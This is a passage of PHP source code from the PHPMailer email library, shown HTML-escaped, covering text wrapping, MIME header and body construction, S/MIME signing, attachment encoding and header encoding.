            return $this-&amp;gt;encodeHeader($this-&amp;gt;secureHeader($addr[1]), &#39;phrase&#39;) . &#39; &amp;lt;&#39; . $this-&amp;gt;secureHeader($addr[0]) . &#39;&amp;gt;&#39;;
        }
    }


    public function wrapText($message, $length, $qp_mode = false)
    {
        $soft_break = ($qp_mode) ? sprintf(&#39; =%s&#39;, $this-&amp;gt;LE) : $this-&amp;gt;LE;

        $is_utf8 = (strtolower($this-&amp;gt;CharSet) == &#39;utf-8&#39;);
        $lelen   = strlen($this-&amp;gt;LE);
        $crlflen = strlen(self::CRLF);

        $message = $this-&amp;gt;fixEOL($message);
        if (substr($message, -$lelen) == $this-&amp;gt;LE) {
            $message = substr($message, 0, -$lelen);
        }

        $line    = explode($this-&amp;gt;LE, $message); // Magic. We know fixEOL uses $LE
        $message = &#39;&#39;;
        for ($i = 0; $i &amp;lt; count($line); $i++) {
            $line_part = explode(&#39; &#39;, $line[$i]);
            $buf       = &#39;&#39;;
            for ($e = 0; $e &amp;lt; count($line_part); $e++) {
                $word = $line_part[$e];
                if ($qp_mode and (strlen($word) &amp;gt; $length)) {
                    $space_left = $length - strlen($buf) - $crlflen;
                    if ($e != 0) {
                        if ($space_left &amp;gt; 20) {
                            $len = $space_left;
                            if ($is_utf8) {
                                $len = $this-&amp;gt;utf8CharBoundary($word, $len);
                            } elseif (substr($word, $len - 1, 1) == &#39;=&#39;) {
                                $len--;
                            } elseif (substr($word, $len - 2, 1) == &#39;=&#39;) {
                                $len -= 2;
                            }
                            $part = substr($word, 0, $len);
                            $word = substr($word, $len);
                            $buf .= &#39; &#39; . $part;
                            $message .= $buf . sprintf(&#39;=%s&#39;, self::CRLF);
                        } else {
                            $message .= $buf . $soft_break;
                        }
                        $buf = &#39;&#39;;
                    }
                    while (strlen($word) &amp;gt; 0) {
                        if ($length &amp;lt;= 0) {
                            break;
                        }
                        $len = $length;
                        if ($is_utf8) {
                            $len = $this-&amp;gt;utf8CharBoundary($word, $len);
                        } elseif (substr($word, $len - 1, 1) == &#39;=&#39;) {
                            $len--;
                        } elseif (substr($word, $len - 2, 1) == &#39;=&#39;) {
                            $len -= 2;
                        }
                        $part = substr($word, 0, $len);
                        $word = substr($word, $len);

                        if (strlen($word) &amp;gt; 0) {
                            $message .= $part . sprintf(&#39;=%s&#39;, self::CRLF);
                        } else {
                            $buf = $part;
                        }
                    }
                } else {
                    $buf_o = $buf;
                    $buf .= ($e == 0) ? $word : (&#39; &#39; . $word);

                    if (strlen($buf) &amp;gt; $length and $buf_o != &#39;&#39;) {
                        $message .= $buf_o . $soft_break;
                        $buf = $word;
                    }
                }
            }
            $message .= $buf . self::CRLF;
        }

        return $message;
    }

    public function utf8CharBoundary($encodedText, $maxLength)
    {
        $foundSplitPos = false;
        $lookBack      = 3;
        while (!$foundSplitPos) {
            $lastChunk      = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, &#39;=&#39;);
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the &#39;=&#39;)
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec &amp;lt; 128) { // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    $maxLength     = ($encodedCharPos == 0) ? $maxLength : $maxLength - ($lookBack - $encodedCharPos);
                    $foundSplitPos = true;
                } elseif ($dec &amp;gt;= 192) { // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength     = $maxLength - ($lookBack - $encodedCharPos);
                    $foundSplitPos = true;
                } elseif ($dec &amp;lt; 192) { // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $foundSplitPos = true;
            }
        }
        return $maxLength;
    }

    public function setWordWrap()
    {
        if ($this-&amp;gt;WordWrap &amp;lt; 1) {
            return;
        }

        switch ($this-&amp;gt;message_type) {
            case &#39;alt&#39;:
            case &#39;alt_inline&#39;:
            case &#39;alt_attach&#39;:
            case &#39;alt_inline_attach&#39;:
                $this-&amp;gt;AltBody = $this-&amp;gt;wrapText($this-&amp;gt;AltBody, $this-&amp;gt;WordWrap);
                break;
            default:
                $this-&amp;gt;Body = $this-&amp;gt;wrapText($this-&amp;gt;Body, $this-&amp;gt;WordWrap);
                break;
        }
    }

    public function createHeader()
    {
        $result = &#39;&#39;;

        // Set the boundaries
        $uniq_id           = md5(uniqid(time()));
        $this-&amp;gt;boundary[1] = &#39;b1_&#39; . $uniq_id;
        $this-&amp;gt;boundary[2] = &#39;b2_&#39; . $uniq_id;
        $this-&amp;gt;boundary[3] = &#39;b3_&#39; . $uniq_id;

        if ($this-&amp;gt;MessageDate == &#39;&#39;) {
            $this-&amp;gt;MessageDate = self::rfcDate();
        }
        $result .= $this-&amp;gt;headerLine(&#39;Date&#39;, $this-&amp;gt;MessageDate);


        // To be created automatically by mail()
        if ($this-&amp;gt;SingleTo) {
            if ($this-&amp;gt;Mailer != &#39;mail&#39;) {
                foreach ($this-&amp;gt;to as $toaddr) {
                    $this-&amp;gt;SingleToArray[] = $this-&amp;gt;addrFormat($toaddr);
                }
            }
        } else {
            if (count($this-&amp;gt;to) &amp;gt; 0) {
                if ($this-&amp;gt;Mailer != &#39;mail&#39;) {
                    $result .= $this-&amp;gt;addrAppend(&#39;To&#39;, $this-&amp;gt;to);
                }
            } elseif (count($this-&amp;gt;cc) == 0) {
                $result .= $this-&amp;gt;headerLine(&#39;To&#39;, &#39;undisclosed-recipients:;&#39;);
            }
        }

        $result .= $this-&amp;gt;addrAppend(&#39;From&#39;, array(
            array(
                trim($this-&amp;gt;From),
                $this-&amp;gt;FromName
            )
        ));

        // sendmail and mail() extract Cc from the header before sending
        if (count($this-&amp;gt;cc) &amp;gt; 0) {
            $result .= $this-&amp;gt;addrAppend(&#39;Cc&#39;, $this-&amp;gt;cc);
        }

        // sendmail and mail() extract Bcc from the header before sending
        if (($this-&amp;gt;Mailer == &#39;sendmail&#39; or $this-&amp;gt;Mailer == &#39;qmail&#39; or $this-&amp;gt;Mailer == &#39;mail&#39;) and count($this-&amp;gt;bcc) &amp;gt; 0) {
            $result .= $this-&amp;gt;addrAppend(&#39;Bcc&#39;, $this-&amp;gt;bcc);
        }

        if (count($this-&amp;gt;ReplyTo) &amp;gt; 0) {
            $result .= $this-&amp;gt;addrAppend(&#39;Reply-To&#39;, $this-&amp;gt;ReplyTo);
        }

        // mail() sets the subject itself
        if ($this-&amp;gt;Mailer != &#39;mail&#39;) {
            $result .= $this-&amp;gt;headerLine(&#39;Subject&#39;, $this-&amp;gt;encodeHeader($this-&amp;gt;secureHeader($this-&amp;gt;Subject)));
        }

        if ($this-&amp;gt;MessageID != &#39;&#39;) {
            $this-&amp;gt;lastMessageID = $this-&amp;gt;MessageID;
        } else {
            $this-&amp;gt;lastMessageID = sprintf(&#39;&amp;lt;%s@%s&amp;gt;&#39;, $uniq_id, $this-&amp;gt;ServerHostname());
        }
        $result .= $this-&amp;gt;HeaderLine(&#39;Message-ID&#39;, $this-&amp;gt;lastMessageID);
        $result .= $this-&amp;gt;headerLine(&#39;X-Priority&#39;, $this-&amp;gt;Priority);
        if ($this-&amp;gt;XMailer == &#39;&#39;) {
            $result .= $this-&amp;gt;headerLine(&#39;X-Mailer&#39;, &#39;PHPMailer &#39; . $this-&amp;gt;Version . &#39; (https://github.com/PHPMailer/PHPMailer/)&#39;);
        } else {
            $myXmailer = trim($this-&amp;gt;XMailer);
            if ($myXmailer) {
                $result .= $this-&amp;gt;headerLine(&#39;X-Mailer&#39;, $myXmailer);
            }
        }

        if ($this-&amp;gt;ConfirmReadingTo != &#39;&#39;) {
            $result .= $this-&amp;gt;headerLine(&#39;Disposition-Notification-To&#39;, &#39;&amp;lt;&#39; . trim($this-&amp;gt;ConfirmReadingTo) . &#39;&amp;gt;&#39;);
        }

        // Add custom headers
        for ($index = 0; $index &amp;lt; count($this-&amp;gt;CustomHeader); $index++) {
            $result .= $this-&amp;gt;headerLine(trim($this-&amp;gt;CustomHeader[$index][0]), $this-&amp;gt;encodeHeader(trim($this-&amp;gt;CustomHeader[$index][1])));
        }
        if (!$this-&amp;gt;sign_key_file) {
            $result .= $this-&amp;gt;headerLine(&#39;MIME-Version&#39;, &#39;1.0&#39;);
            $result .= $this-&amp;gt;getMailMIME();
        }

        return $result;
    }

    public function getMailMIME()
    {
        $result      = &#39;&#39;;
        $ismultipart = true;
        switch ($this-&amp;gt;message_type) {
            case &#39;inline&#39;:
                $result .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/related;&#39;);
                $result .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[1] . &#39;&amp;quot;&#39;);
                break;
            case &#39;attach&#39;:
            case &#39;inline_attach&#39;:
            case &#39;alt_attach&#39;:
            case &#39;alt_inline_attach&#39;:
                $result .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/mixed;&#39;);
                $result .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[1] . &#39;&amp;quot;&#39;);
                break;
            case &#39;alt&#39;:
            case &#39;alt_inline&#39;:
                $result .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/alternative;&#39;);
                $result .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[1] . &#39;&amp;quot;&#39;);
                break;
            default:
                // Catches case &#39;plain&#39;: and case &#39;&#39;:
                $result .= $this-&amp;gt;textLine(&#39;Content-Type: &#39; . $this-&amp;gt;ContentType . &#39;; charset=&#39; . $this-&amp;gt;CharSet);
                $ismultipart = false;
                break;
        }
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($this-&amp;gt;Encoding != &#39;7bit&#39;) {
            // RFC 2045 section 6.4 says multipart MIME parts may only use 7bit, 8bit or binary CTE
            if ($ismultipart) {
                if ($this-&amp;gt;Encoding == &#39;8bit&#39;) {
                    $result .= $this-&amp;gt;headerLine(&#39;Content-Transfer-Encoding&#39;, &#39;8bit&#39;);
                }
                // The only remaining alternatives are quoted-printable and base64, which are both 7bit compatible
            } else {
                $result .= $this-&amp;gt;headerLine(&#39;Content-Transfer-Encoding&#39;, $this-&amp;gt;Encoding);
            }
        }

        if ($this-&amp;gt;Mailer != &#39;mail&#39;) {
            $result .= $this-&amp;gt;LE;
        }

        return $result;
    }

    public function getSentMIMEMessage()
    {
        return $this-&amp;gt;MIMEHeader . $this-&amp;gt;mailHeader . self::CRLF . $this-&amp;gt;MIMEBody;
    }


    public function createBody()
    {
        $body = &#39;&#39;;

        if ($this-&amp;gt;sign_key_file) {
            $body .= $this-&amp;gt;getMailMIME() . $this-&amp;gt;LE;
        }

        $this-&amp;gt;setWordWrap();

        $bodyEncoding = $this-&amp;gt;Encoding;
        $bodyCharSet  = $this-&amp;gt;CharSet;
        if ($bodyEncoding == &#39;8bit&#39; and !$this-&amp;gt;has8bitChars($this-&amp;gt;Body)) {
            $bodyEncoding = &#39;7bit&#39;;
            $bodyCharSet  = &#39;us-ascii&#39;;
        }
        $altBodyEncoding = $this-&amp;gt;Encoding;
        $altBodyCharSet  = $this-&amp;gt;CharSet;
        if ($altBodyEncoding == &#39;8bit&#39; and !$this-&amp;gt;has8bitChars($this-&amp;gt;AltBody)) {
            $altBodyEncoding = &#39;7bit&#39;;
            $altBodyCharSet  = &#39;us-ascii&#39;;
        }
        switch ($this-&amp;gt;message_type) {
            case &#39;inline&#39;:
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[1], $bodyCharSet, &#39;&#39;, $bodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;inline&#39;, $this-&amp;gt;boundary[1]);
                break;
            case &#39;attach&#39;:
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[1], $bodyCharSet, &#39;&#39;, $bodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;attachment&#39;, $this-&amp;gt;boundary[1]);
                break;
            case &#39;inline_attach&#39;:
                $body .= $this-&amp;gt;textLine(&#39;--&#39; . $this-&amp;gt;boundary[1]);
                $body .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/related;&#39;);
                $body .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[2] . &#39;&amp;quot;&#39;);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[2], $bodyCharSet, &#39;&#39;, $bodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;inline&#39;, $this-&amp;gt;boundary[2]);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;attachment&#39;, $this-&amp;gt;boundary[1]);
                break;
            case &#39;alt&#39;:
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[1], $altBodyCharSet, &#39;text/plain&#39;, $altBodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;AltBody, $altBodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[1], $bodyCharSet, &#39;text/html&#39;, $bodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                if (!empty($this-&amp;gt;Ical)) {
                    $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[1], &#39;&#39;, &#39;text/calendar; method=REQUEST&#39;, &#39;&#39;);
                    $body .= $this-&amp;gt;encodeString($this-&amp;gt;Ical, $this-&amp;gt;Encoding);
                    $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                }
                $body .= $this-&amp;gt;endBoundary($this-&amp;gt;boundary[1]);
                break;
            case &#39;alt_inline&#39;:
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[1], $altBodyCharSet, &#39;text/plain&#39;, $altBodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;AltBody, $altBodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;textLine(&#39;--&#39; . $this-&amp;gt;boundary[1]);
                $body .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/related;&#39;);
                $body .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[2] . &#39;&amp;quot;&#39;);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[2], $bodyCharSet, &#39;text/html&#39;, $bodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;inline&#39;, $this-&amp;gt;boundary[2]);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;endBoundary($this-&amp;gt;boundary[1]);
                break;
            case &#39;alt_attach&#39;:
                $body .= $this-&amp;gt;textLine(&#39;--&#39; . $this-&amp;gt;boundary[1]);
                $body .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/alternative;&#39;);
                $body .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[2] . &#39;&amp;quot;&#39;);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[2], $altBodyCharSet, &#39;text/plain&#39;, $altBodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;AltBody, $altBodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[2], $bodyCharSet, &#39;text/html&#39;, $bodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;endBoundary($this-&amp;gt;boundary[2]);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;attachment&#39;, $this-&amp;gt;boundary[1]);
                break;
            case &#39;alt_inline_attach&#39;:
                $body .= $this-&amp;gt;textLine(&#39;--&#39; . $this-&amp;gt;boundary[1]);
                $body .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/alternative;&#39;);
                $body .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[2] . &#39;&amp;quot;&#39;);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[2], $altBodyCharSet, &#39;text/plain&#39;, $altBodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;AltBody, $altBodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;textLine(&#39;--&#39; . $this-&amp;gt;boundary[2]);
                $body .= $this-&amp;gt;headerLine(&#39;Content-Type&#39;, &#39;multipart/related;&#39;);
                $body .= $this-&amp;gt;textLine(&amp;quot;\tboundary=\&amp;quot;&amp;quot; . $this-&amp;gt;boundary[3] . &#39;&amp;quot;&#39;);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;getBoundary($this-&amp;gt;boundary[3], $bodyCharSet, &#39;text/html&#39;, $bodyEncoding);
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                $body .= $this-&amp;gt;LE . $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;inline&#39;, $this-&amp;gt;boundary[3]);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;endBoundary($this-&amp;gt;boundary[2]);
                $body .= $this-&amp;gt;LE;
                $body .= $this-&amp;gt;attachAll(&#39;attachment&#39;, $this-&amp;gt;boundary[1]);
                break;
            default:
                // catch case &#39;plain&#39; and case &#39;&#39;
                $body .= $this-&amp;gt;encodeString($this-&amp;gt;Body, $bodyEncoding);
                break;
        }

        if ($this-&amp;gt;isError()) {
            $body = &#39;&#39;;
        } elseif ($this-&amp;gt;sign_key_file) {
            try {
                if (!defined(&#39;PKCS7_TEXT&#39;)) {
                    throw new phpmailerException($this-&amp;gt;lang(&#39;signing&#39;) . &#39; OpenSSL extension missing.&#39;);
                }
                // @TODO would be nice to use php://temp streams here, but need to wrap for PHP &amp;lt; 5.1
                $file = tempnam(sys_get_temp_dir(), &#39;mail&#39;);
                if (false === file_put_contents($file, $body)) {
                    throw new phpmailerException($this-&amp;gt;lang(&#39;signing&#39;) . &#39; Could not write temp file&#39;);
                }
                $signed = tempnam(sys_get_temp_dir(), &#39;signed&#39;);
                if (@openssl_pkcs7_sign($file, $signed, &#39;file://&#39; . realpath($this-&amp;gt;sign_cert_file), array(
                    &#39;file://&#39; . realpath($this-&amp;gt;sign_key_file),
                    $this-&amp;gt;sign_key_pass
                ), null)) {
                    @unlink($file);
                    $body = file_get_contents($signed);
                    @unlink($signed);
                } else {
                    @unlink($file);
                    @unlink($signed);
                    throw new phpmailerException($this-&amp;gt;lang(&#39;signing&#39;) . openssl_error_string());
                }
            }
            catch (phpmailerException $exc) {
                $body = &#39;&#39;;
                if ($this-&amp;gt;exceptions) {
                    throw $exc;
                }
            }
        }
        return $body;
    }

    protected function getBoundary($boundary, $charSet, $contentType, $encoding)
    {
        $result = &#39;&#39;;
        if ($charSet == &#39;&#39;) {
            $charSet = $this-&amp;gt;CharSet;
        }
        if ($contentType == &#39;&#39;) {
            $contentType = $this-&amp;gt;ContentType;
        }
        if ($encoding == &#39;&#39;) {
            $encoding = $this-&amp;gt;Encoding;
        }
        $result .= $this-&amp;gt;textLine(&#39;--&#39; . $boundary);
        $result .= sprintf(&#39;Content-Type: %s; charset=%s&#39;, $contentType, $charSet);
        $result .= $this-&amp;gt;LE;
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($encoding != &#39;7bit&#39;) {
            $result .= $this-&amp;gt;headerLine(&#39;Content-Transfer-Encoding&#39;, $encoding);
        }
        $result .= $this-&amp;gt;LE;

        return $result;
    }

    protected function endBoundary($boundary)
    {
        return $this-&amp;gt;LE . &#39;--&#39; . $boundary . &#39;--&#39; . $this-&amp;gt;LE;
    }

    protected function setMessageType()
    {
        $type = array();
        if ($this-&amp;gt;alternativeExists()) {
            $type[] = &#39;alt&#39;;
        }
        if ($this-&amp;gt;inlineImageExists()) {
            $type[] = &#39;inline&#39;;
        }
        if ($this-&amp;gt;attachmentExists()) {
            $type[] = &#39;attach&#39;;
        }
        $this-&amp;gt;message_type = implode(&#39;_&#39;, $type);
        if ($this-&amp;gt;message_type == &#39;&#39;) {
            $this-&amp;gt;message_type = &#39;plain&#39;;
        }
    }

    public function headerLine($name, $value)
    {
        return $name . &#39;: &#39; . $value . $this-&amp;gt;LE;
    }

    public function textLine($value)
    {
        return $value . $this-&amp;gt;LE;
    }

    public function addAttachment($path, $name = &#39;&#39;, $encoding = &#39;base64&#39;, $type = &#39;&#39;, $disposition = &#39;attachment&#39;)
    {
        try {
            if (!@is_file($path)) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;file_access&#39;) . $path, self::STOP_CONTINUE);
            }

            // If a MIME type is not specified, try to work it out from the file name
            if ($type == &#39;&#39;) {
                $type = self::filenameToType($path);
            }

            $filename = basename($path);
            if ($name == &#39;&#39;) {
                $name = $filename;
            }

            $this-&amp;gt;attachment[] = array(
                0 =&amp;gt; $path,
                1 =&amp;gt; $filename,
                2 =&amp;gt; $name,
                3 =&amp;gt; $encoding,
                4 =&amp;gt; $type,
                5 =&amp;gt; false, // isStringAttachment
                6 =&amp;gt; $disposition,
                7 =&amp;gt; 0
            );

        }
        catch (phpmailerException $exc) {
            $this-&amp;gt;setError($exc-&amp;gt;getMessage());
            $this-&amp;gt;edebug($exc-&amp;gt;getMessage());
            if ($this-&amp;gt;exceptions) {
                throw $exc;
            }
            return false;
        }
        return true;
    }

    public function getAttachments()
    {
        return $this-&amp;gt;attachment;
    }

    protected function attachAll($disposition_type, $boundary)
    {
        // Return text of body
        $mime    = array();
        $cidUniq = array();
        $incl    = array();

        // Add all attachments
        foreach ($this-&amp;gt;attachment as $attachment) {
            // Check if it is a valid disposition_filter
            if ($attachment[6] == $disposition_type) {
                // Check for string attachment
                $string  = &#39;&#39;;
                $path    = &#39;&#39;;
                $bString = $attachment[5];
                if ($bString) {
                    $string = $attachment[0];
                } else {
                    $path = $attachment[0];
                }

                $inclhash = md5(serialize($attachment));
                if (in_array($inclhash, $incl)) {
                    continue;
                }
                $incl[]      = $inclhash;
                $name        = $attachment[2];
                $encoding    = $attachment[3];
                $type        = $attachment[4];
                $disposition = $attachment[6];
                $cid         = $attachment[7];
                if ($disposition == &#39;inline&#39; &amp;amp;&amp;amp; isset($cidUniq[$cid])) {
                    continue;
                }
                $cidUniq[$cid] = true;

                $mime[] = sprintf(&#39;--%s%s&#39;, $boundary, $this-&amp;gt;LE);
                $mime[] = sprintf(&#39;Content-Type: %s; name=&amp;quot;%s&amp;quot;%s&#39;, $type, $this-&amp;gt;encodeHeader($this-&amp;gt;secureHeader($name)), $this-&amp;gt;LE);
                // RFC1341 part 5 says 7bit is assumed if not specified
                if ($encoding != &#39;7bit&#39;) {
                    $mime[] = sprintf(&#39;Content-Transfer-Encoding: %s%s&#39;, $encoding, $this-&amp;gt;LE);
                }

                if ($disposition == &#39;inline&#39;) {
                    $mime[] = sprintf(&#39;Content-ID: &amp;lt;%s&amp;gt;%s&#39;, $cid, $this-&amp;gt;LE);
                }

                // If a filename contains any of these chars, it should be quoted,
                // but not otherwise: RFC2183 &amp;amp; RFC2045 5.1
                // Fixes a warning in IETF&#39;s msglint MIME checker
                // Allow for bypassing the Content-Disposition header totally
                if (!(empty($disposition))) {
                    $encoded_name = $this-&amp;gt;encodeHeader($this-&amp;gt;secureHeader($name));
                    if (preg_match(&#39;/[ \(\)&amp;lt;&amp;gt;@,;:\\&amp;quot;\/\[\]\?=]/&#39;, $encoded_name)) {
                        $mime[] = sprintf(&#39;Content-Disposition: %s; filename=&amp;quot;%s&amp;quot;%s&#39;, $disposition, $encoded_name, $this-&amp;gt;LE . $this-&amp;gt;LE);
                    } else {
                        $mime[] = sprintf(&#39;Content-Disposition: %s; filename=%s%s&#39;, $disposition, $encoded_name, $this-&amp;gt;LE . $this-&amp;gt;LE);
                    }
                } else {
                    $mime[] = $this-&amp;gt;LE;
                }

                // Encode as string attachment
                if ($bString) {
                    $mime[] = $this-&amp;gt;encodeString($string, $encoding);
                    if ($this-&amp;gt;isError()) {
                        return &#39;&#39;;
                    }
                    $mime[] = $this-&amp;gt;LE . $this-&amp;gt;LE;
                } else {
                    $mime[] = $this-&amp;gt;encodeFile($path, $encoding);
                    if ($this-&amp;gt;isError()) {
                        return &#39;&#39;;
                    }
                    $mime[] = $this-&amp;gt;LE . $this-&amp;gt;LE;
                }
            }
        }

        $mime[] = sprintf(&#39;--%s--%s&#39;, $boundary, $this-&amp;gt;LE);

        return implode(&#39;&#39;, $mime);
    }

    protected function encodeFile($path, $encoding = &#39;base64&#39;)
    {
        try {
            if (!is_readable($path)) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;file_open&#39;) . $path, self::STOP_CONTINUE);
            }
            $magic_quotes = get_magic_quotes_runtime();
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, &#39;5.3.0&#39;, &#39;&amp;lt;&#39;)) {
                    set_magic_quotes_runtime(false);
                } else {
                    ini_set(&#39;magic_quotes_runtime&#39;, 0);
                }
            }
            $file_buffer = file_get_contents($path);
            $file_buffer = $this-&amp;gt;encodeString($file_buffer, $encoding);
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, &#39;5.3.0&#39;, &#39;&amp;lt;&#39;)) {
                    set_magic_quotes_runtime($magic_quotes);
                } else {
                    ini_set(&#39;magic_quotes_runtime&#39;, ($magic_quotes ? &#39;1&#39; : &#39;0&#39;));
                }
            }
            return $file_buffer;
        }
        catch (Exception $exc) {
            $this-&amp;gt;setError($exc-&amp;gt;getMessage());
            return &#39;&#39;;
        }
    }

    public function encodeString($str, $encoding = &#39;base64&#39;)
    {
        $encoded = &#39;&#39;;
        switch (strtolower($encoding)) {
            case &#39;base64&#39;:
                $encoded = chunk_split(base64_encode($str), 76, $this-&amp;gt;LE);
                break;
            case &#39;7bit&#39;:
            case &#39;8bit&#39;:
                $encoded = $this-&amp;gt;fixEOL($str);
                // Make sure it ends with a line break
                if (substr($encoded, -(strlen($this-&amp;gt;LE))) != $this-&amp;gt;LE) {
                    $encoded .= $this-&amp;gt;LE;
                }
                break;
            case &#39;binary&#39;:
                $encoded = $str;
                break;
            case &#39;quoted-printable&#39;:
                $encoded = $this-&amp;gt;encodeQP($str);
                break;
            default:
                $this-&amp;gt;setError($this-&amp;gt;lang(&#39;encoding&#39;) . $encoding);
                break;
        }
        return $encoded;
    }

    public function encodeHeader($str, $position = &#39;text&#39;)
    {
        $matchcount = 0;
        switch (strtolower($position)) {
            case &#39;phrase&#39;:
                if (!preg_match(&#39;/[\200-\377]/&#39;, $str)) {
                    // Can&#39;t use addslashes as we don&#39;t know the value of magic_quotes_sybase
                    $encoded = addcslashes($str, &amp;quot;\0..\37\177\\\&amp;quot;&amp;quot;);
                    if (($str == $encoded) &amp;amp;&amp;amp; !preg_match(&#39;/[^A-Za-z0-9!#$%&amp;amp;\&#39;*+\/=?^_`{|}~ -]/&#39;, $str)) {
                        return ($encoded);
                    } else {
                        return (&amp;quot;\&amp;quot;$encoded\&amp;quot;&amp;quot;);
                    }
                }
                $matchcount = preg_match_all(&#39;/[^\040\041\043-\133\135-\176]/&#39;, $str, $matches);
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case &#39;comment&#39;:
                $matchcount = preg_match_all(&#39;/[()&amp;quot;]/&#39;, $str, $matches);
            // Intentional fall-through
            case &#39;text&#39;:
            default:
                $matchcount += preg_match_all(&#39;/[\000-\010\013\014\016-\037\177-\377]/&#39;, $str, $matches);
                break;
        }

        if ($matchcount == 0) { // There are no chars that need encoding
            return ($str);
        }

        $maxlen = 75 - 7 - strlen($this-&amp;gt;CharSet);
        // Try to select the encoding which should produce the shortest output
        if ($matchcount &amp;gt; strlen($str) / 3) {
            // More than a third of the content will need encoding, so B encoding will be most efficient
            $encoding = &#39;B&#39;;
            if (function_exists(&#39;mb_strlen&#39;) &amp;amp;&amp;amp; $this-&amp;gt;hasMultiBytes($str)) {
                $encoded = $this-&amp;gt;base64EncodeWrapMB($str, &amp;quot;\n&amp;quot;);
            } else {
                $encoded = base64_encode($str);
                $maxlen -= $maxlen % 4;
                $encoded = trim(chunk_split($encoded, $maxlen, &amp;quot;\n&amp;quot;));
            }
        } else {
            $encoding = &#39;Q&#39;;
            $encoded  = $this-&amp;gt;encodeQ($str, $position);
            $encoded  = $this-&amp;gt;wrapText($encoded, $maxlen, true);
